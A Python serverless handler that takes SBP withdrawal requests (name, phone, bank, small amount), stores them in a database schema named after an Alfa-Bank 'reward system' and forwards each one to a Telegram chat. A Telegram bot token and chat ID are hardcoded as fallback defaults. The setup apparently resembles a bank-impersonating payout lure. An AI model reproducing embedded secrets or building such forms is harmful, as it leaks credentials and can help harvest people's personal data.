import json
import os
import psycopg2
import urllib.request
import urllib.parse
from typing import Dict, Any
from decimal import Decimal

def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
    '''
    Business: Принимает заявки на вывод средств через СБП и отправляет уведомления в Telegram
    Args: event - dict с httpMethod, body, queryStringParameters
          context - object с атрибутами: request_id, function_name, function_version
    Returns: HTTP response dict
    '''
    method: str = event.get('httpMethod', 'GET')
    
    if method == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'POST, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Max-Age': '86400'
            },
            'body': '',
            'isBase64Encoded': False
        }
    
    if method != 'POST':
        return {
            'statusCode': 405,
            'headers': {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            'body': json.dumps({'error': 'Method not allowed'}),
            'isBase64Encoded': False
        }
    
    body_data = json.loads(event.get('body', '{}'))
    
    full_name = body_data.get('fullName', '').strip()
    phone_number = body_data.get('phoneNumber', '').strip()
    bank_name = body_data.get('bankName', '').strip()
    amount = body_data.get('amount')
    
    if not full_name or not phone_number or not bank_name or not amount:
        return {
            'statusCode': 400,
            'headers': {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            'body': json.dumps({'error': 'All fields are required'}),
            'isBase64Encoded': False
        }
    
    try:
        amount_decimal = Decimal(str(amount))
        if amount_decimal < 100 or amount_decimal > 500:
            return {
                'statusCode': 400,
                'headers': {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                },
                'body': json.dumps({'error': 'Amount must be between 100 and 500'}),
                'isBase64Encoded': False
            }
    except (ValueError, TypeError):
        return {
            'statusCode': 400,
            'headers': {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            'body': json.dumps({'error': 'Invalid amount'}),
            'isBase64Encoded': False
        }
    
    database_url = os.environ.get('DATABASE_URL')
    if not database_url:
        return {
            'statusCode': 500,
            'headers': {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            'body': json.dumps({'error': 'Database configuration error'}),
            'isBase64Encoded': False
        }
    
    conn = psycopg2.connect(database_url)
    cursor = conn.cursor()
    
    cursor.execute(
        "INSERT INTO t_p42469412_alfa_bank_reward_sys.withdrawal_requests (full_name, card_number, phone_number, bank_name, amount, status) VALUES (%s, %s, %s, %s, %s, %s) RETURNING id",
        (full_name, '', phone_number, bank_name, str(amount_decimal), 'pending')
    )
    
    request_id = cursor.fetchone()[0]
    conn.commit()
    
    cursor.close()
    conn.close()
    
    bot_token = os.environ.get('TELEGRAM_BOT_TOKEN', '8381227388:AAFrKamHR3QbNmsi-AfALZlnoi2-xQMW2uA')
    chat_id = os.environ.get('TELEGRAM_CHAT_ID', '8310988244')
    
    message = f"""🔔 Новая заявка на вывод #{request_id}

👤 ФИО: {full_name}
📱 Телефон: {phone_number}
🏦 Банк: {bank_name}
💰 Сумма: {amount_decimal} ₽

Статус: Ожидает обработки"""
    
    telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'HTML'
    }
    
    try:
        req = urllib.request.Request(
            telegram_url,
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req)
    except Exception:
        pass
    
    return {
        'statusCode': 200,
        'headers': {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        },
        'body': json.dumps({
            'success': True,
            'requestId': request_id,
            'message': 'Withdrawal request submitted successfully'
        }),
        'isBase64Encoded': False
    }